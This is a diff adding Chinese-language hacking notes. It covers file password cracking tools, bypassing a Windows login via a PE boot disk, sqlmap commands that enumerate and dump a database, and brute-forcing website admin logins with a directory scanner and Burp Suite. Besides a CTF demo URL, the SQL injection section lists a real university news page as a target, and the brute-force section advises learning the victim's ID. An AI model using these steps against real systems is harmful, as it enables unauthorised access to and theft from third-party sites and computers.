@@ -1,0 +1,96 @@
+vmware 安装kali  略:
+使用：
+
+
+Advanced 的三种文件破解方式   zip压缩包   pdf  
+
+Advanced Archive Password Recoery  --zip文件
+Advanced office Password Recoery    --word、ppt等
+Advanced  PDF Password Recoery      --PDF文件
+###上述工具下载
+
+
+
+
+kali自带的字典:
+gzip -d /usr/share/wordlists/rocyou.txt.gz 
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+windows开机密码破除：
+1.windows的密码的保存位置：C:\Windows\System32\config    SAM   本机无法打开
+
+2.制作一个PE  推荐使用杏雨梨云 http://sinoxer.lofter.com  无广告
+
+3.进入bios设置
+
+4.进入PE系统
+
+5.密码删除或者更改
+
+
+系统漏洞扫描:
+nessus
+下载地址：http://www.tenable.com/products/nssus/select-your-operating-system 
+激活官网；http://www.tenable.com/products/nussus-home
+
+
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+sql注入:
+检测漏洞存在和选择工具（sqlmap）(inurl:asp?id=)
+注入步骤（演示：http://ctf.shiyanbar.com/8/index.php?id=1）
+http://pub.sdufe.edu.cn/news/view.php?id=35918
+
+1.找注入点并检测
+sqlmap -u "连接"
+
+2.列库 （显示数据库）
+sqlmap -u "连接" --dbs 
+
+3.列表 （显示其中的表）
+sqlmap -u "连接" -D 数据库 --tables 
+
+4.列字段 （显示表中字段）
+sqlmap -u "连接" -D 数据库 -T 表名 --columns
+
+5.爆内容 (显示字段内容)
+sqlmap -u "连接" -D 数据库 -T 表名 -C 字段 --dump
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+网站后台暴露破解
+1.利用工具扫描后台敏感目录
+扫描工具:御剑后台扫描工具（自己可百度最新版）
+
+2.找到登陆入口利用burpsuite进行破解
+burpsuite在kali中有集成，需要一个靠谱的字典，可以自己生成，可以搜
+最好想办法知道对方的id，如果id不知道，那么破坏难度将会加大
+
+3.暴力破解的受限之处
+如果有验证码是很难办的，简单的可以跳过
+可以用自己家里路由器登陆界面练手
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
